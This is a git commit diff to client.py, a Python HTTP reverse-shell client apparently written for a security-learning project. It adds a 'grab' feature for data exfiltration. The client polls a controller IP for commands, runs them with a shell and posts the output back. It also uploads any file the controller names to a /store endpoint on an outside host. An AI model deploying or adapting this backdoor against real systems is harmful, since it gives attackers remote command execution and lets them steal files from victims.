36b4837a215cb939efe23492f8f902c8e7ca6d34
Apurv Singh Gautam <apurvsinghgautam@gmail.com>
2017-06-03 10:24:56 +0000

    Data Exfiltration added

--- client.py
+++ client.py
@@ -1,25 +1,32 @@
-
 #Client
 
 import requests     #Library to be installed and imported
 import subprocess 
 import time
-
+import os
 
 while True: 
 
     req = requests.get('http://10.10.10.100')      # Send GET request to host machine
     command = req.text                             # Store the received txt into command variable
-        
+
     if 'terminate' in command:
         break 
 
+    elif 'grab' in command:
+        grab,path=command.split('*')
+
+        if os.path.exists(path):
+            url='http://192.168.158.128/store'   #Append /store in the URL
+            files = {'file': open(path, 'rb')} # Add a dictionary key where file will be stored
+            r=requests.post(url, files=files) # Send the file
+            #requests library use POST method called "multipart/form-data"
+        else:
+            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !' )
     else:
-        CMD =  subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE stderr=subprocess.PIPE,shell=True,)
-        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )  
-        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )  
-
+        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
+        post_response = requests.post(url='http://192.168.158.128', data=CMD.stdout.read() ) 
+        post_response = requests.post(url='http://192.168.158.128', data=CMD.stderr.read() )  
     time.sleep(3)
+
     
-
-
